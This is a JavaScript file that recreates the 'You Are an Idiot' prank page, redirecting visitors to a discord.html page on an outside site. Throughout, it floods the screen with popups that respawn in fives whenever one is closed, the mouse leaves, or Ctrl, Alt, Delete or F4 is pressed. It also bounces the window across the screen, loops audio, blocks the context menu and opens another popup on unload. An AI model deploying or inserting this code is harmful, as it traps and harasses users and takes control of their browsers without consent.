function checkAndRedirect() {
    if (document.hasFocus() && !window.location.pathname.includes('/discord.html')) {
        window.location.href = 'https://youare.qzz.io/discord.html';
    }
}
checkAndRedirect();
window.addEventListener('focus', checkAndRedirect);
document.addEventListener('click', function playMusicOnce() {  
    const audio = document.getElementById('youare-audio');  
    const micon = document.getElementById('youare-micon');  
  
    if (!audio || !micon) return;  
  
    document.removeEventListener('click', playMusicOnce);  
}, { once: true });  
  
const faudio = new Audio('media/youare.mp3');  
faudio.addEventListener('timeupdate', function () {  
    if (this.currentTime > this.duration - 0.45) {  
        this.currentTime = 0;  
        this.play();  
    }  
});  
function bookmark() {  
    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
        window.external.AddFavorite("discord.html", "‎‎Idiot!");  
    }  
}  
  
const openWindows = [];  
let mouseX = 0;  
let mouseY = 0;  
  
document.addEventListener("mousemove", e => {  
    mouseX = e.clientX;  
    mouseY = e.clientY;  
});  
function openWindow(url) {
    const width = Math.round(window.screen.width * 0.1875);
    const height = Math.round(window.screen.height * 0.2222);

    // Random on-screen position
    const maxLeft = Math.max(0, screen.availWidth - width);
    const maxTop = Math.max(0, screen.availHeight - height);

    const left = Math.floor(Math.random() * (maxLeft + 1));
    const top = Math.floor(Math.random() * (maxTop + 1));

    const features =
        `menubar=no,status=no,resizable=no,` +
        `width=${width},height=${height},left=${left},top=${top}`;

    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        for (const win of openWindows) {
            try {
                if (!win.closed) win.moveTo(0, 0);
            } catch (e) {}
        }

        openWindows.push(aWindow);

        const timer = setInterval(() => {
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) {
                    openWindows.splice(i, 1);
                }
            }

            if (aWindow.closed) {
                clearInterval(timer);
                proCreate();
            }
        }, 20);
    }
}
function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow("discord.html");
    }
}
  
  
let xOff = 5, yOff = 5;
let xPos = 400, yPos = -100;
let flagRun = 1;

function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
}

function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function fOff() {
    flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) {
        newXlt();
    }

    if (xPos < 0) {
        newXrt();
    }

    if (yPos > screen.height - 330) {
        newYup();
    }

    if (yPos < 0) {
        newYdn();
    }

    if (flagRun === 1) {
        try {
            window.moveTo(xPos, yPos);
        } catch (e) {
            flagRun = 0;
        }

        setTimeout(playBall, 1);
    }
}
  
window.onload = function () {  
    flagRun = 1;  
    playBall();  
    bookmark();  
};  
  
window.onmouseout = function () {
    proCreate();
};

window.oncontextmenu = function () {
    return false;
};  


window.onkeydown = function (event) {
    const keyCode = event.keyCode;

    if ([17, 18, 46, 115].includes(keyCode)) {
        proCreate();
    }
};
window.addEventListener("unload", function () {
   // proCreate();
    openWindow("discord.html");
});
